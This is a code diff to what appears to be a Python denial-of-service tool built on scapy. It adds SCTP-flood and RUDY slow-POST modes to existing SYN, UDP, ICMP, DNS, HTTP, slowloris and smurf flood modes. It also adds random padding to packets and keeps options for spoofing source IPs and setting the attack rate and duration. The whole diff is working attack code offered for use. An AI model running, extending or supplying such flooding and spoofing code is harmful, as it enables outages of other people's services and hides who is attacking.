@@ -1,14 +1,15 @@
 #! /usr/bin/env python3
-import argparse
-import random
-import threading
 import time
+import random
+import argparse
+import threading
 from scapy.all import *
 from scapy.layers.dns import DNS, DNSQR
-from scapy.layers.inet import TCP, IP, ICMP, UDP
 from scapy.packet import Raw
 from scapy.sendrecv import send
-from scapy.volatile import RandShort, RandString
+from scapy.layers.sctp import SCTP
+from scapy.layers.l2 import Ether, ARP
+from scapy.layers.inet import TCP, UDP, ICMP, IP
 
 from source.dosinatorfiglet import dosinatorfiglet
 
@@ -34,30 +35,33 @@ def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, cust
             payload = Raw(RandString(size=packet_size))
 
         if attack_mode == "syn":
-            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags='S') / payload
+            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags='S') / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "udp":
-            packet = IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port) / payload
+            packet = IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port) / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "icmp":
             packet = IP(src=source_ip, dst=target_ip) / ICMP() / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "dns":
             domain = f"{generate_random_ip()}.com"
-            packet = IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port) / DNS(rd=1, qd=DNSQR(qname=domain)) / payload
+            packet = IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port) / DNS(rd=1, qd=DNSQR(qname=domain)) / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "os_fingerprint":
             packet = IP(src=source_ip, dst=target_ip) / ICMP() / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "http":
             headers = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)
-            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port) / headers / payload
+            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port) / headers / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "slowloris":
-            # Slowloris için özel bir paket oluşturun
             packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port) / Raw("X-a: b\r\n") / payload
         elif attack_mode == "smurf":
-            # Smurf saldırısı için özel bir ICMP Echo Request (Ping) mesajı oluşturun
-            packet = IP(src=source_ip, dst=target_ip) / ICMP(type=8, code=0) / payload
+            packet = IP(src=source_ip, dst=target_ip) / ICMP(type=8, code=0) / payload / Raw(RandString(size=packet_size))
+        elif attack_mode == "sctp":
+            packet = IP(src=source_ip, dst=target_ip) / SCTP(sport=source_port, dport=target_port) / payload / Raw(RandString(size=packet_size))
+        elif attack_mode == "rudy":
+            headers = "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\n".format(target_ip, packet_size)
+            payload = "X-a: b\r\n"
+            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags='A') / headers / payload / Raw(RandString(size=packet_size))
         else:
             print("Invalid attack mode.")
             return
 
-        # Paketi göndermeden önce PCAP dosyasına kaydet
         if pcap_file:
             wrpcap(pcap_file, packet, append=True)
 
@@ -124,7 +128,7 @@ if __name__ == '__main__':
     parser.add_argument('-ps', '--packet_size', type=int, default=64, help='Packet size in bytes (default: 64)')
     parser.add_argument('-ar', '--attack_rate', type=int, default=10, help='Attack rate in packets/second (default: 10)')
     parser.add_argument('-d ', '--duration', type=int, help='Duration of the attack in seconds')
-    parser.add_argument('-am', '--attack-mode', choices=["syn", "udp", "icmp", "http", "dns", "os_fingerprint","slowloris", "smurf"], default="syn", help='Attack mode (default: syn)')
+    parser.add_argument('-am', '--attack-mode', choices=["syn", "sctp", "udp", "icmp", "http", "dns", "os_fingerprint", "slowloris", "smurf", "rudy"], default="syn", help='Attack mode (default: syn)')
     parser.add_argument('-sp', '--spoof-ip', default=None, help='Spoof IP address')
     parser.add_argument('--data', type=str, default=None, help='Custom data string to send')
     parser.add_argument('--file', type=str, default=None, help='File path to read data from')
@@ -141,7 +145,7 @@ if __name__ == '__main__':
     attack_mode = args.attack_mode
     data = args.data
     file_path = args.file
-    pcap_file = args.pcap  # Ekledik
+    pcap_file = args.pcap
 
     if args.spoof_ip == "random":
         spoof_ip = generate_random_ip
